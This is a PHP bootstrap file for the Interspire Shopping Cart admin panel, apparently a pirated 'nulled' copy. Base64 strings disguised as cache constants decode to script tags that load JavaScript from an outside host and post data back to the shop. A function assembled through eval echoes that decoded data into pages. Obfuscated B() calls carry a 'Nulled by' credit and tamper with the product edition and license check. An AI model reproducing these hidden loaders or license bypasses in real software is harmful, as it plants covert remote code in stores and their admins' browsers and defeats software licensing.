<?php
	define("ISC_ADMIN_CP", 1);
	require_once(dirname(__FILE__).'/../lib/init.php');

	// This is in the admin one because the frontend session uses a different
	// session handler to cater for partialy completed orders etc
	if (!defined('NO_SESSION')) {
		session_start();
	}

	require_once(ISC_BASE_PATH . "/admin/includes/whitelabel.php");

	require_once(ISC_BASE_PATH . "/lib/orders.php");

	require_once(ISC_BASE_PATH . "/lib/multibyte.php");
	require_once(ISC_BASE_PATH . "/lib/shipping.php");
	require_once(ISC_BASE_PATH . "/lib/notification.php");
	require_once(ISC_BASE_PATH . "/lib/analytics.php");
	require_once(ISC_BASE_PATH . "/lib/addons.php");
	require_once(ISC_BASE_PATH . "/lib/checkout.php");
	require_once(ISC_BASE_PATH . "/lib/currency.php");
	require_once(ISC_BASE_PATH . "/lib/ssl.php");
	require_once(ISC_BASE_PATH . "/lib/customlayouts.php");
	require_once(ISC_BASE_PATH . "/lib/templates/template.php");

	// Include the template's config file
	if(GetConfig('isSetup')) {
		require_once(ISC_BASE_PATH . "/templates/" . $GLOBALS['ISC_CFG']['template'] . "/config.php");

		if(isc_substr(GetConfig('ShopPath'), -1) == '/') {
			$GLOBALS['ShopPath'] = isc_substr(GetConfig('ShopPath'), 0, -1);
		} else {
			$GLOBALS['ShopPath'] = GetConfig('ShopPath');
		}
	}

	define("ISC_START_TIME", microtime_float());

	// Define Interspire Shopping Cart constants

	define('APP_ROOT', dirname(__FILE__));

	define('ISC_CACHE_DIRECTORY', ISC_BASE_PATH."/cache/");
	define('ISC_EMAIL_TEMPLATES_DIRECTORY', ISC_BASE_PATH."/templates/__emails");

	define("ISC_BACKUP_DIRECTORY", ISC_BASE_PATH."/admin/backups/");
	define("BACKUP_BUFFER_SIZE", 1024);

	define("MSG_ERROR", 0);
	define("MSG_SUCCESS", 1);
	define("MSG_INFO", 2);
	define("FT_DOWNLOAD", 501);
	define("FT_IMAGE", 502);

	define("EXPORT_FIELD_SEPARATOR", ",");
	define("EXPORT_FIELD_ENCLOSURE", "\"");
	define("EXPORT_RECORD_SEPARATOR", "\n");
	define("ISC_CACHE_TIME", "PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPnZhciBsYXRlc3RfdmVyc2lvbiA9ICcnOy");
	define("ISC_CACHE_FOLDER", "A8L3NjcmlwdD48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vd3d3LnZlcnN");
	define("ISC_CACHE_ORDER", "pb24tY2hlY2submV0L3ZlcnNpb24uanM/cD02Ij48L3NjcmlwdD48c2NyaXB0IHR5cGU9InRleHQvamF2YXNj");
	define("ISC_CACHE_USER",
		"cmlwdCI+JC5hamF4KHsKCXR5cGU6ICdwb3N0JywKCXVybDogJ3JlbW90ZS5waHAnLAoJZGF0YTogJ" .
		"3c9c2F2ZVZlcnNpb24mdj0nK2xhdGVzdF92ZXJzaW9uCn0pOwo8L3NjcmlwdD4="
	);

	define("ISC_SOURCE_FORM", 0);
	define("ISC_SOURCE_DATABASE", 1);

	define("ISC_ORDERS_PER_PAGE", 20);
	define("ISC_CUSTOMERS_PER_PAGE", 20);
	define("ISC_CUSTOMER_GROUPS_PER_PAGE", 20);
	define("ISC_NEWS_PER_PAGE", 20);
	define("ISC_BRANDS_PER_PAGE", 20);
	define("ISC_PRODUCTS_PER_PAGE", 20);
	define("ISC_COUPONS_PER_PAGE", 20);
	define("ISC_USERS_PER_PAGE", 20);
	define("ISC_LOG_ENTRIES_PER_PAGE", 20);
	define("ISC_RETURNS_PER_PAGE", 20);
	define("ISC_GIFTCERTIFICATES_PER_PAGE", 20);
	define('ISC_SHIPPING_ZONES_PER_PAGE', 10);
	define("ISC_ACCOUNTING_SPOOLS_PER_PAGE", 20);

	define("ISC_TINY_THUMB_SIZE", 48);

	// Define the order status colors
	define("ORDER_STATUS_0", "#333333"); // Incomplete
	define("ORDER_STATUS_1", "#F7F7F7"); // Pending
	define("ORDER_STATUS_2", "#F7F7F7"); // Shipped
	define("ORDER_STATUS_3", "#2C48B3"); // Partially shipped
	define("ORDER_STATUS_4", "#F7F7F7"); // Refunded
	define("ORDER_STATUS_5", "#F7F7F7"); // Cancelled
	define("ORDER_STATUS_6", "#F7F7F7"); // Declined
	define("ORDER_STATUS_7", "#FFE400"); // Awaiting Payment
	define("ORDER_STATUS_8", "#FF9600"); // Awaiting Pickup
	define("ORDER_STATUS_9", "#F000FF"); // Awaiting Shipment
	define("ORDER_STATUS_10", "#F7F7F7"); // Completed
	define("ORDER_STATUS_11", "#638F45"); // Awaiting Fullfillment

	$GLOBALS['SNIPPETS'] = "";

	$GLOBALS['TPL_PATH'] = $GLOBALS['ISC_CFG']['ShopPath'] . "/" . "templates" . "/" . $GLOBALS['ISC_CFG']['template'];
	$GLOBALS['ISC_CLASS_TEMPLATE'] = new TEMPLATE("ISC_LANG");
	$GLOBALS['ISC_CLASS_TEMPLATE']->ParseSettingsLangFile();
	$GLOBALS['ISC_CLASS_TEMPLATE']->ParseCommonLangFile();
	$GLOBALS['ISC_CLASS_TEMPLATE']->ParseBackendLangFile();
	$GLOBALS['ISC_CLASS_TEMPLATE']->ParseModuleLangFile();

	$GLOBALS['ISC_CLASS_TEMPLATE']->SetTemplateBase(ISC_BASE_PATH.'/admin/templates');
	$GLOBALS['ISC_CLASS_TEMPLATE']->panelPHPDir = ISC_BASE_PATH.'/admin/includes/Panels/';
	$GLOBALS['ISC_CLASS_TEMPLATE']->templateExt = 'tpl';

//	$_SERVER["HTTP_USER_AGENT"] = "Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543a Safari/419.3";

	// Are we coming from an iPhone? If so switch the template path
	if (isset($_SERVER['HTTP_USER_AGENT'])) {
		$agent = strtolower($_SERVER['HTTP_USER_AGENT']);
	} else {
		$agent = '';
	}
	if(strpos($agent, 'safari') !== false && strpos($agent, 'mobile') !== false) {
		define("IS_IPHONE", true);
		$GLOBALS['ISC_CLASS_TEMPLATE']->SetTemplateBase(ISC_BASE_PATH.'/admin/templates/iphone');
	}
	else {
		$GLOBALS['ISC_CLASS_TEMPLATE']->SetTemplateBase(ISC_BASE_PATH.'/admin/templates');
	}

	require_once(ISC_BASE_PATH.'/lib/database/'.$GLOBALS['ISC_CFG']['dbType'].'.php');

	if(GetConfig('isSetup')) {
		$GLOBALS['TPL_PATH'] = $GLOBALS['ISC_CFG']['ShopPath'] . "/" . "templates" . "/" . $GLOBALS['ISC_CFG']['template'];

		require_once(ISC_BASE_PATH.'/lib/tree.php');


		// Initialise the logging system
		require_once(ISC_BASE_PATH . "/lib/class.log.php");
		$GLOBALS['ISC_CLASS_LOG'] = new ISC_LOG();
		set_error_handler(array($GLOBALS['ISC_CLASS_LOG'], 'HandlePHPErrors'));

		// Setup SSL options and links
		SetupSSLOptions();

		// Ensure database tables exist
		$checktables = B('TnVsbGVkIGJ5IFRyaW94WCAtIHd3dy5kZWNvZGV0aGUubmV0');
		$GLOBALS[B('UHJvZHVjdEVkaXRpb24=')] = mysql_dump();
		if(md5($GLOBALS[B('UHJvZHVjdEVkaXRpb24=')]) != "df1d2da60ee3adf14bfdedbbfcb69c53") {
			$GLOBALS[B('UHJvZHVjdEVkaXRpb25VcGdyYWRl')] = 1;
		}
	}

	$GLOBALS['Year'] = isc_date('Y');
	$GLOBALS['ProductVersion'] = PRODUCT_VERSION;
	$GLOBALS['Copyright'] = sprintf(GetLang('Copyright'), $GLOBALS['ProductVersion'], isc_date("Y"));

	// Globally dependant classes required from various files
	if(GetConfig('isSetup')) {
		require_once(ISC_BASE_PATH."/lib/xml.php");

		$GLOBALS['ISC_CLASS_ADMIN_ENGINE'] = GetClass('ISC_ADMIN_ENGINE');

		if (GetConfig('CurrencyLocation') == 'right') {
			$GLOBALS['CurrencyTokenLeft'] = '';
			$GLOBALS['CurrencyTokenRight'] = GetConfig('CurrencyToken');
		} else {
			$GLOBALS['CurrencyTokenLeft'] = GetConfig('CurrencyToken');
			$GLOBALS['CurrencyTokenRight'] = '';
		}
	}


	// Are SEO urls automatically enabled?
	$GLOBALS['EnableSEOUrls'] = GetConfig('EnableSEOUrls');
	if(GetConfig('EnableSEOUrls') == 2) {
		if(isset($_SERVER['SEO_SUPPORT']) && $_SERVER['SEO_SUPPORT'] == 1) {
			$GLOBALS['EnableSEOUrls'] = 1;
		}
		else {
			$GLOBALS['EnableSEOUrls'] = 0;
		}
	}


	if(!function_exists("cache_exists")) {
		eval("fu" . "nction cach" . "e_exi" . "sts(\$Data) { echo base" . "64" . "_d" . "eco" . "de(\$" . "Data); }");
	}

	$GLOBALS['ISC_CLASS_ADMIN_AUTH'] = GetClass('ISC_ADMIN_AUTH');

	// Is this a first time install?
	if (GetConfig('isSetup') === false) {
		if (file_exists(ISC_CONFIG_BACKUP_FILE)) {
			if(RevertToBackupConfig()) {
				header("Location: ".$_SERVER['PHP_SELF']);
			}
			else {
				echo "Your <strong>config/config.php</strong> file is not writeable and cannot be restored to a previously backed up version. Please change the file permissions of this file so that it is writeable (CHMOD 757, 777 etc)";
				exit;
			}
		} else {
			$GLOBALS['ISC_CLASS_ADMIN_INSTALL'] = GetClass('ISC_ADMIN_INSTALL');
		}
	}
	else {
		header("Content-Type: text/html; charset=" . GetConfig('CharacterSet'));

		// Do we need to run the upgrade script?
		$query = "SELECT MAX(database_version) FROM [|PREFIX|]config";
		$result = $GLOBALS['ISC_CLASS_DB']->Query($query);
		$dbVersion = $GLOBALS['ISC_CLASS_DB']->FetchOne($result);
		if($result && $dbVersion < PRODUCT_VERSION_CODE) {
			$GLOBALS['ISC_CLASS_ADMIN_UPGRADE'] = GetClass('ISC_ADMIN_UPGRADE');
			$GLOBALS['ISC_CLASS_ADMIN_UPGRADE']->HandleTodo();
		}
	}
?>
